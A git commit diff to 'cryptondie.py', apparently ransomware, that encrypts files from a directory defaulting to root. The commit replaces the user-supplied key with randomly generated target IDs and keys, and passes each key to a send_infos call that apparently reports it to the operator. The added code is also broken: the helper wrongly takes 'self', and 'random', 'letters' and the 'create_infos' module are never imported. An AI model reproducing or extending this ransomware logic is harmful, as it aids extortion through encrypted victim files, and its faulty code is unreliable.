ea00ba9b342f435076d9c08f8cb29d4dfd08fed0
gmdutra <gmdutra.eu@gmail.com>
2019-09-21 01:14:54 -0300

    Add function generate_random_string

--- cryptondie.py
+++ cryptondie.py
@@ -6,16 +6,20 @@ from modules import encryption
 from modules import search_files
 from modules import info
 from datetime import datetime
+from create_infos import CreateInfos
 
 def get_time():
     today = datetime.now()
     today = today.strftime("%d/%m/%Y %H:%M:%S")
 
     return today
+    
+def generate_random_string(self, length=32):
+    random_string = ''.join(random.choice(letters) for i in range(length))
+    return random_string
 
 def main():
     parser = argparse.ArgumentParser(add_help=False, usage=info.help_message)
-    parser.add_argument('--key', dest="key", required=True)
     parser.add_argument('--dir', dest="directory", default="/")
     parser.add_argument('--encrypt', dest="encrypt", action="store_true")
     parser.add_argument('--decrypt', dest="decrypt", action="store_true")
@@ -23,13 +27,18 @@ def main():
 
     args = parser.parse_args()
 
-    key = args.key
     directory = args.directory
     encrypt = args.encrypt
     decrypt = args.decrypt
     verbose = args.verbose
 
-    encrypt = encryption.EncryptionData(key)
+    target_id = generate_random_string(12)
+    infos = create_infos.CreateInfos(target_id)
+
+    target_key = generate_random_string()
+    infos.send_infos(target_key)
+
+    encrypt = encryption.EncryptionData(target_key)
     files = search_files.SearchDirThree(directory)
     all_files = files.search_all_files()
     
